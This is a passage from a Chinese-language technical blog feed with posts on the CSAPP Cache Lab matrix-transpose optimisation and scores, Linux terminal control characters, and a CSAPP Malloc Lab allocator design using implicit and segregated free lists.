A[i][j+<span class="number">5</span>];</span><br><span class="line">                a7 = A[i][j+<span class="number">6</span>];</span><br><span class="line">                a8 = A[i][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">                B[j+<span class="number">1</span>][i] = a2;</span><br><span class="line">                B[j+<span class="number">2</span>][i] = a3;</span><br><span class="line">                B[j+<span class="number">3</span>][i] = a4;</span><br><span class="line">                B[j+<span class="number">4</span>][i] = a5;</span><br><span class="line">                B[j+<span class="number">5</span>][i] = a6;</span><br><span class="line">                B[j+<span class="number">6</span>][i] = a7;</span><br><span class="line">                B[j+<span class="number">7</span>][i] = a8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">56</span>; j &lt; <span class="number">61</span>; ++j) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">64</span>; i &lt; <span class="number">67</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">61</span>; ++j) &#123;</span><br><span class="line">                a1 = A[i][j];</span><br><span class="line">                B[j][i] = a1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="64-64"><a href="#64-64" class="headerlink" title="64 * 64"></a>64 * 64</h4><p>对于64 * 64矩阵，每4行就有冲突，如使用8 * 8分块会导致块内就有冲突，只能得0分。</p>
<p>因此，这里改用4 * 4分块，再利用局部变量，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1667 misses, 3.8 points</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i, j, l;</span><br><span class="line">        <span class="type">int</span> a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; M; i += <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; N; j += <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(l = i; l &lt; i + <span class="number">4</span>; l += <span class="number">2</span>) &#123;</span><br><span class="line">                    a1 = A[l][j];</span><br><span class="line">                    a2 = A[l][j+<span class="number">1</span>];</span><br><span class="line">                    a3 = A[l][j+<span class="number">2</span>];</span><br><span class="line">                    a4 = A[l][j+<span class="number">3</span>];</span><br><span class="line">                    a5 = A[l+<span class="number">1</span>][j];</span><br><span class="line">                    a6 = A[l+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">                    a7 = A[l+<span class="number">1</span>][j+<span class="number">2</span>];</span><br><span class="line">                    a8 = A[l+<span class="number">1</span>][j+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">                    B[j][l] = a1;</span><br><span class="line">                    B[j+<span class="number">1</span>][l] = a2;</span><br><span class="line">                    B[j+<span class="number">2</span>][l] = a3;</span><br><span class="line">                    B[j+<span class="number">3</span>][l] = a4;</span><br><span class="line">                    B[j][l+<span class="number">1</span>] = a5;</span><br><span class="line">                    B[j+<span class="number">1</span>][l+<span class="number">1</span>] = a6;</span><br><span class="line">                    B[j+<span class="number">2</span>][l+<span class="number">1</span>] = a7;</span><br><span class="line">                    B[j+<span class="number">3</span>][l+<span class="number">1</span>] = a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果为<code>1667</code>次，没有满分，原因是没有充分利用缓存。需要满分的可以参考：<a href="https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source=debugrun&utm_medium=referral">https://www.cnblogs.com/liqiuhao/p/8026100.html?utm_source&#x3D;debugrun&amp;utm_medium&#x3D;referral</a></p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>代码上传到github，仅供参考：<a href="https://github.com/PCJ600/CacheLab">https://github.com/PCJ600/CacheLab</a></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./driver.py</span><br><span class="line">Part A: Testing cache simulator</span><br><span class="line">Running ./test-csim</span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">Part B: Testing transpose function</span><br><span class="line">Running ./test-trans -M 32 -N 32</span><br><span class="line">Running ./test-trans -M 64 -N 64</span><br><span class="line">Running ./test-trans -M 61 -N 67</span><br><span class="line"></span><br><span class="line">Cache Lab summary:</span><br><span class="line">                        Points   Max pts      Misses</span><br><span class="line">Csim correctness          27.0        27</span><br><span class="line">Trans perf 32x32           8.0         8         287</span><br><span class="line">Trans perf 64x64           3.8         8        1667</span><br><span class="line">Trans perf 61x67          10.0        10        1889</span><br><span class="line">          Total points    48.8        53</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://zhuanlan.zhihu.com/p/142942823">CSAPP实验之cacheLab</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常见控制字符介绍</title>
    <url>/2020/08/29/2020-08-29-common-ctrl-char-in-linux/</url>
    <content><![CDATA[<h2 id="ctrl-c"><a href="#ctrl-c" class="headerlink" title="ctrl + c"></a>ctrl + c</h2><p>中断键，给前台进程组中所有进程发送<code>SIGINT</code>信号，并终止进程。</p>
<h2 id="ctrl-z"><a href="#ctrl-z" class="headerlink" title="ctrl + z"></a>ctrl + z</h2><p>挂起键，给前台进程组中所有进程发送<code>SIGTSTP</code>信号,  并挂起进程。被挂起的进程并没有真正结束，可以使用<code>fg</code>或<code>bg</code>命令恢复被挂起的进程。</p>
<span id="more"></span>

<ul>
<li>fg —— 将后台作业放到前台终端运行。例如用VIM编辑文件时，需要敲shell命令。可以先用<code>Ctrl + Z</code>挂起VIM，敲完shell命令后再使用<code>fg</code>命令恢复VIM继续编辑，好处是不用退出VIM程序。</li>
<li>bg —— 恢复后台被挂起的作业，变成在后台继续执行。例如前台启动一个程序时，不希望一直等待程序运行结束，可以先用<code>Ctrl+Z</code>挂起进程，再使用<code>bg</code>命令后台恢复程序的执行，好处是不用终止程序。</li>
<li>jobs —— 显示当前shell中后台正在运行或被挂起的任务列表。</li>
</ul>
<h2 id="ctrl-d"><a href="#ctrl-d" class="headerlink" title="ctrl + d"></a>ctrl + d</h2><p>表示一个特殊二进制值<code>EOF</code>，表示已到达文件末尾(<code>end of file</code>), 可以用来快速退出终端。</p>
<h2 id="ctrl-s"><a href="#ctrl-s" class="headerlink" title="ctrl + s"></a>ctrl + s</h2><p>中断控制台的输出。有时终端卡死了，敲什么都没反应，很可能是敲了<code>Ctrl + S</code>，可以接着敲<code>Ctrl + q</code>恢复。</p>
<h2 id="ctrl"><a href="#ctrl" class="headerlink" title="ctrl + \"></a>ctrl + \</h2><p>终止进程，并向进程发送<code>SIGQUIT</code>信号，默认会产生<code>coredump</code>文件。</p>
<h2 id="ctrl-l"><a href="#ctrl-l" class="headerlink" title="ctrl + l"></a>ctrl + l</h2><p>清屏， 相当于终端里敲<code>clear</code>。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/730989a7302e">Linux常见信号大全</a></p>
<p><a href="https://blog.csdn.net/mylizh/article/details/38385739?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.channel_param">Linux中ctrl-c, ctrl-z, ctrl-d区别</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP malloc实验</title>
    <url>/2020/09/26/2020-09-26-csapp-malloclab/</url>
    <content><![CDATA[<h3 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h3><p>实现自己的动态内存分配器（<code>malloc</code>、<code>free</code>、<code>realloc</code>）。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li>阅读《CSAPP原书第3版》 9.9小节 —— 动态内存分配。</li>
<li>阅读<a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">writeup</a>的全部内容。</li>
</ul>
<span id="more"></span>

<h4 id="分配器的设计要求"><a href="#分配器的设计要求" class="headerlink" title="分配器的设计要求"></a>分配器的设计要求</h4><ul>
<li>处理任意请求序列，分配器不可以假设分配和释放请求的顺序。</li>
<li>立即响应请求, 不允许分配器为了提高性能重新排列或缓冲请求。</li>
<li>只使用堆。</li>
<li>对齐块，以保存任何类型的数据对象。</li>
<li>不修改已分配的块，分配器只能操作和改变空闲块。</li>
</ul>
<h4 id="分配器的设计目标"><a href="#分配器的设计目标" class="headerlink" title="分配器的设计目标"></a>分配器的设计目标</h4><ul>
<li>最大化吞吐率 —— 每个<code>malloc</code>, <code>free</code>执行的指令越少，吞吐率会越好。</li>
<li>最大化内存利用率。</li>
</ul>
<h4 id="实现问题"><a href="#实现问题" class="headerlink" title="实现问题"></a>实现问题</h4><p>关键是把握<strong>吞吐率</strong>和<strong>内存利用率</strong>之间的平衡。</p>
<ul>
<li>空闲块组织 —— 如何记录空闲块？</li>
<li>放置 —— 如何选一个合适的空闲块来放置一个新分配的块？ （首次适配&#x2F;下次适配&#x2F;最优适配）</li>
<li>分割 —— 将一个新分配块放到某个空闲块后，如何处理这个空闲块的剩余部分？</li>
<li>合并 —— 如何处理一个刚被释放的块？ （立即合并&#x2F;延迟合并）</li>
</ul>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>代码下载：<a href="http://csapp.cs.cmu.edu/3e/malloclab-handout.tar">http://csapp.cs.cmu.edu/3e/malloclab-handout.tar</a></p>
<p>目标是实现<code>mm.c</code>中的如下函数, 原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p>这里使用两种方式实现<code>malloc</code>，分别如下：</p>
<ul>
<li>隐式空闲链表 + 首次适配&#x2F;下一次适配。</li>
<li>显示空闲链表 + 分离的空闲链表 +  分离适配。</li>
</ul>
<h3 id="隐式空闲链表法"><a href="#隐式空闲链表法" class="headerlink" title="隐式空闲链表法"></a>隐式空闲链表法</h3><p>原书9.9.6节详细介绍了隐式空闲链表法，并贴出了所有源代码。代码实现细节请参考原书或者 <a href="https://github.com/PCJ600/MallocLab/tree/br64">https://github.com/PCJ600/MallocLab/tree/br64</a></p>
<h5 id="隐式空闲链表的形式如下："><a href="#隐式空闲链表的形式如下：" class="headerlink" title="隐式空闲链表的形式如下："></a>隐式空闲链表的形式如下：</h5><p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image1.png"></p>
<ul>
<li>每个堆块使用边界标记法。头部大小为4字节，前29位表示块大小，后3位表示这个块是否空闲；脚部(ftr)是头部(hdr)的副本。目的是<strong>将合并前面的堆块时的搜索时间降到常数</strong>。</li>
<li><strong>第1个填充字用于8字节对齐访问</strong>。考虑64位场景，如不添加填充字，heap_listp的值不能整除8，不满足对齐条件！</li>
<li>序言块和结尾块的设计是消除合并时边界条件的技巧。</li>
<li>按8字节对齐要求， 一个堆块最小为 4(头部) + 8(payload) + 4(脚部) &#x3D; 16字节</li>
<li>为什么是”隐式”的？——  因为空闲块是通过头部中大小字段隐含地连接着，从而间接遍历整个空闲块的集合。</li>
</ul>
<h4 id="1-初始化堆-——-mm-init函数"><a href="#1-初始化堆-——-mm-init函数" class="headerlink" title="1. 初始化堆 —— mm_init函数"></a>1. 初始化堆 —— mm_init函数</h4><p><code>mm_init</code>步骤如下：</p>
<ul>
<li><p>首先在堆上分配16个字节，包括4字节对齐块，8字节序言块，4字节结尾块。</p>
</li>
<li><p>调<code>extend_heap</code>扩展堆，创建初始的空闲块，大小为4096字节。</p>
</li>
</ul>
<h4 id="2-扩展堆-——-extend-heap函数"><a href="#2-扩展堆-——-extend-heap函数" class="headerlink" title="2. 扩展堆 —— extend_heap函数"></a>2. 扩展堆 —— extend_heap函数</h4><p>函数原型: <code>static void *extend_heap(size_t words);</code></p>
<p>以下两种场景需要扩展堆：</p>
<ul>
<li>调用<code>mm_init</code>初始化堆时。</li>
<li>调用<code>mm_malloc</code>找不到合适的空闲块时。</li>
</ul>
<p>举例：堆上扩展4096个字节，堆数组前后变化如下：</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image2.png"></p>
<h4 id="3-释放和合并块-——-mm-free和coalesce函数"><a href="#3-释放和合并块-——-mm-free和coalesce函数" class="headerlink" title="3. 释放和合并块 —— mm_free和coalesce函数"></a>3. 释放和合并块 —— mm_free和coalesce函数</h4><p>调用<code>mm_free</code>释放块，步骤如下：</p>
<ul>
<li><p>将当前块的头部和脚部中的分配位清零。</p>
</li>
<li><p>将这个块与它邻接的前后空闲块进行合并，采用立即合并策略。</p>
</li>
</ul>
<p>调用<code>coalesce</code>合并前后的合并块，原型：<code>static void *coalesce(void *bp);</code>，分四种情况：</p>
<ul>
<li>情况1：前面的块和后面的块都已分配 —— 不可能合并，简单返回bp即可。</li>
<li>情况2：前面的块已分配，后面的块空闲 —— 用当前块和后面块的大小之和更新当前块的头部和后面块的脚部。返回bp</li>
<li>情况3：前面的块是空闲的，后面的块是分配的 —— 用两块大小之和更新前面块的头部和后面块的脚部。返回<code>PREV_BLKP(bp)</code></li>
<li>情况4：前面和后面的块都是空闲的 —— 用三个块大小之和更新前面块的头部和后面块的脚部。返回<code>PREV_BLKP(bp)</code></li>
</ul>
<p>说的比较啰嗦，以下画图帮助理解：</p>
<p><strong>情况2:</strong> 前面的块已分配，后面的块空闲</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image3.png"></p>
<p><strong>注意：</strong> <font color = 'red'><strong>如采用下次适配策略，在情况3、情况4合并后可能出现pre_listp指针不再指向一个块的payload段，报payload overlap错!</strong></font></p>
<p>因此必须更新<code>pre_listp</code>。这里简单将<code>pre_listp</code>指向合并后的新块的<code>payload</code>即可。</p>
<p><strong>情况3：</strong> 前面的块是空闲的，后面的块是分配的</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image4.png"></p>
<p><strong>情况4：</strong> 前面和后面的块均空闲<br><img src="/2020/09/26/2020-09-26-csapp-malloclab/image5.png"><br>[O#### 4. 分配块 —— mm_malloc</p>
<h5 id="mm-malloc步骤"><a href="#mm-malloc步骤" class="headerlink" title="mm_malloc步骤"></a>mm_malloc步骤</h5><ul>
<li><p>调整请求块的大小，需不低于16字节（8字节对齐要求），并舍入到8的整数倍。</p>
</li>
<li><p>根据请求块的大小，搜索空闲链表寻找合适的空闲块：</p>
<ul>
<li>如果找到合适的块，将请求块放置到这个合适的块中，并可选地分割这个块</li>
<li>如找不到合适的块，调<code>extend_heap</code>扩展堆，分配新的空闲块。将请求块放到这个新的空闲块里，并可选地分割这个块</li>
</ul>
</li>
</ul>
<h5 id="适配算法"><a href="#适配算法" class="headerlink" title="适配算法"></a>适配算法</h5><p>分配器搜索空闲块的方式由放置策略决定，常见策略有首次适配、下一次适配等。</p>
<ul>
<li><p>首次适配： 从头搜索空闲链表，选择第一个合适地空闲块。</p>
</li>
<li><p>下一次适配： 从上次查询结束的地方开始搜索空闲链表。</p>
</li>
</ul>
<h5 id="分割策略"><a href="#分割策略" class="headerlink" title="分割策略"></a>分割策略</h5><p>如分割后剩下的块不小于最小块大小(16字节)，才分割这个块。</p>
<p>设空闲块大小为M字节，<code>malloc</code>请求的块大小为N字节。只有M - N &gt;&#x3D; 16，才分割这个块。</p>
<p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image6.png"></p>
<h4 id="5-实现mm-realloc"><a href="#5-实现mm-realloc" class="headerlink" title="5. 实现mm_realloc"></a>5. 实现mm_realloc</h4><p><code>mm_realloc</code>原型：<code>void *mm_realloc(void *ptr, size_t size)</code></p>
<p><a href="http://csapp.cs.cmu.edu/3e/malloclab.pdf">writeup</a>中提到了<code>mm_realloc</code>的所有实现要点，如下：</p>
<ul>
<li>如果ptr为NULL， 等价于调用mm_malloc</li>
<li>如果size为0, 等价于调用mm_free</li>
<li>如ptr不为NULL且size不为0， 参考realloc函数的实现： <code>man 3 realloc</code></li>
</ul>
<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><p>执行<code>./mdriver -t traces/ -V</code>，查看详细结果：</p>
<p>首次适配: 44 (util) + 24 (thru) &#x3D; 68&#x2F;100</p>
<p>下一次适配：43 (util) + 40 (thru) &#x3D; 83&#x2F;100</p>
<h3 id="分离空闲链表法"><a href="#分离空闲链表法" class="headerlink" title="分离空闲链表法"></a>分离空闲链表法</h3><p>实现代码参考：<a href="https://github.com/PCJ600/MallocLab">https://github.com/PCJ600/MallocLab</a></p>
<p>使用分离的空闲链表，分配器会维护一个空闲链表的数组。每个空闲链表和一个大小类关联，被组织成某种类型的显式或隐式链表。笔者这里使用以下方案：</p>
<ul>
<li>链表结构为<strong>显式的双向链表</strong></li>
<li>大小类分为 {16-31},{32,63},{64,127}, …, {4096, 8191}, … 链表个数<code>MAX_LIST_NUM</code> 默认设置为20，可调整。</li>
<li>考虑兼容性，分配器需要在32位&#x2F;64位环境下都能正常运行。</li>
</ul>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li>32位机器上，指针大小为4字节；64位机器上， 指针大小为8字节。可使用<code>sizeof(intptr_t)</code>表示指针大小, <code>intptr_t</code>类型是ISO C99定义的，可参考<code>/usr/include/stdint.h</code></li>
<li>实验要求不使用全局变量，可以将分离链表的头指针放到堆中。</li>
<li>默认Makefile采用<code>-m32</code>选项，64位环境下需要改成<code>-m64</code>。</li>
<li>实验涉及大量指针操作，编码极易出错。需掌握基本的gdb调试手段、并编写代码检查堆区和分离链表。</li>
</ul>
<h4 id="显式的双向链表的堆块结构"><a href="#显式的双向链表的堆块结构" class="headerlink" title="显式的双向链表的堆块结构"></a>显式的双向链表的堆块结构</h4><p><img src="/2020/09/26/2020-09-26-csapp-malloclab/image7.png"></p>
<ul>
<li><p>对于空闲块，<code>pred</code>保存上一个空闲块的地址，<code>succ</code>保存下一个空闲块的地址。</p>
</li>
<li><p>使用双向链表结构，适配算法的时间复杂度从O(块总数)降到O(空闲块总数)。</p>
</li>
<li><p>不难得出：32位系统，块至少为16字节；64位系统，块至少为24字节。</p>
</li>
</ul>
<h3 id="如何调试？"><a href="#如何调试？" class="headerlink" title="如何调试？"></a>如何调试？</h3><ul>
<li>设置编译选项<code>-g -O0</code>取消编译优化。</li>
<li>设置编译选项<code>-g3 -gdwarf-2</code>调试宏。</li>
<li>可以设置<code>-DDEBUG</code>宏，通过编译宏控制是否打印调试信息。</li>
<li>实现<code>mm_print</code>函数，在gdb中通过<code>call mm_print()</code>打印堆区和分离链表。</li>
</ul>
<h4 id="打印堆数组状态和所有分离链表-——-mm-print函数设计"><a href="#打印堆数组状态和所有分离链表-——-mm-print函数设计" class="headerlink" title="打印堆数组状态和所有分离链表 —— mm_print函数设计"></a>打印堆数组状态和所有分离链表 —— mm_print函数设计</h4><ul>
<li><p>打印堆数组中每个块的头部、脚部、大小、分配位、payload指针。</p>
</li>
<li><p>打印堆数组中所有分离链表头指针的值。</p>
</li>
<li><p>打印每条分离链表的所有块的头部、脚部、大小、分配位、payload指针。</p>
</li>
</ul>
<h4 id="堆区和分离链表检查-——-mm-check函数设计"><a href="#堆区和分离链表检查-——-mm-check函数设计" class="headerlink" title="堆区和分离链表检查 —— mm_check函数设计"></a>堆区和分离链表检查 —— mm_check函数设计</h4><p><strong>检查堆区状态，包括：</strong></p>
<ul>
<li>检查序言块、结尾块的指针、大小、分配位是否正确。</li>
<li>检查每个块的payload指针是否满足对齐要求。</li>
<li>检查每个块的payload指针是否在堆区的合法地址范围内(<code>mem_heap_lo() ~ mem_heap_hi()</code>之间)。</li>
<li>检查每个块的头部和脚部是否一致。</li>
<li>检查每个块的大小是否不低于最小块的大小，是否为4&#x2F;8字节的倍数。</li>
<li>采用立即合并策略时，检查不存在任意两个相邻的空闲块。</li>
</ul>
<p><strong>检查分离链表状态，包括：</strong></p>
<ul>
<li><p>检查链表中所有指针是否在堆区的合法地址范围内。</p>
</li>
<li><p>检查双向链表实现是否正确，是否每个指针A的后继为B时，B的前驱也同时为A。</p>
</li>
<li><p>检查分离链表中所有的空闲块是否与堆数组的空闲块中找到并匹配。</p>
</li>
<li><p>检查堆数组中每个空闲块是否都能在分离链表中找到并匹配。</p>
</li>
<li><p>检查堆数组中每个已占用块是否都不在分离链表中。</p>
</li>
</ul>
<p><strong>针对malloc做如下检查：</strong></p>
<ul>
<li>malloc返回前，检查指针p是否在堆数组中，如不在堆数组中说明出错。</li>
<li>malloc返回前，检查指针p对应的块大小是否不小于malloc请求的大小。</li>
</ul>
<p><strong>针对free做如下检查：</strong></p>
<ul>
<li><p>调用free时，先检查指针p是否在堆区的合法地址范围内。</p>
</li>
<li><p>调用free时，先检查p是否指向了堆数组中某个已分配块。</p>
</li>
</ul>
<p>实现代码参考： <a href="https://github.com/PCJ600/MallocLab/blob/master/mm.c">https://github.com/PCJ600/MallocLab/blob/master/mm.c</a>  <code>mm_check</code>函数</p>
<h4 id="指针运算、宏定义"><a href="#指针运算、宏定义" class="headerlink" title="指针运算、宏定义"></a>指针运算、宏定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT (sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~(ALIGNMENT-1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4                                     <span class="comment">// 4字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8                                     <span class="comment">// 双字: 8字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12)                         <span class="comment">// 4096字节, 执行extend_heap一次, 堆上扩展的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc)  ((size) | (alloc))		<span class="comment">// 设置分配位， 前29位表示块大小，后3位表示是否已分配</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)             (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val)        (*(unsigned int *)(p) = (val))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)        (GET(p) &amp; ~(0x1))        <span class="comment">// 获取块大小, 这里块大小不会超过2^32字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)       (GET(p) &amp; 0x1)           <span class="comment">// 判断这个块是否已分配</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针类型读写，使用intptr_t兼容32位/64位机器</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_P(p)           (*(intptr_t *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_P(p, val)      (*(intptr_t *)(p) = (intptr_t)(val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分离链表: |(16-31)|(32-63)|(64-127)|(128-255)| ..... |(2^23,2^24-1)|，这里设置20条链表</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LIST_NUM 20                                 <span class="comment">// 分离链表最大数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_INDEX 4                                     <span class="comment">// 最小块为16字节, 即2^4。这里MIN_INDEX表示分离链表中第一条链表的最小块大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_BLOCK_SIZE (DSIZE + 2 * sizeof(intptr_t))	<span class="comment">// 块大小的最小值，32位为16字节， 64位为24字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR(bp)     ((char *)(bp))						<span class="comment">// 强转成char *类型指针</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)    ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)    ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV(bp)    ((char *)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCC(bp)    ((char *)(bp) + sizeof(intptr_t))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PREV(bp) ((char *)(GET_P(PREV(bp))))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUCC(bp) ((char *)(GET_P(SUCC(bp))))</span></span><br></pre></td></tr></table></figure>

<h4 id="辅助函数设计"><a href="#辅助函数设计" class="headerlink" title="辅助函数设计"></a>辅助函数设计</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span>; <span class="comment">/* 将大小为size的空闲块插入分离空闲链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_node</span><span class="params">(<span class="type">void</span> *p)</span>; 			   <span class="comment">/* 从分离链表中删除指定块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *p)</span>; 			   <span class="comment">/* 合并空闲块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">place</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size)</span>;  	   <span class="comment">/* 放置大小为size的块到p指向的空闲块 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> size)</span>;         <span class="comment">/* 扩展堆 */</span></span><br><span class="line"><span class="comment">/* 在所有分离链表中找合适空闲块，返回空闲块指针 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">find_free_block</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">/* 将p指向的块插入第idx个分离链表 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_node_by_list_index</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> size, <span class="type">int</span> idx)</span>;</span><br><span class="line"><span class="comment">/* 移除第i条分离链表上的节点p; 如p不在链表中，则删除失败返回false,否则返回true */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">delete_node_by_list_index</span><span class="params">(<span class="type">void</span> *p, <span class="type">int</span> size, <span class="type">int</span> idx)</span>;</span><br></pre></td></tr></table></figure>

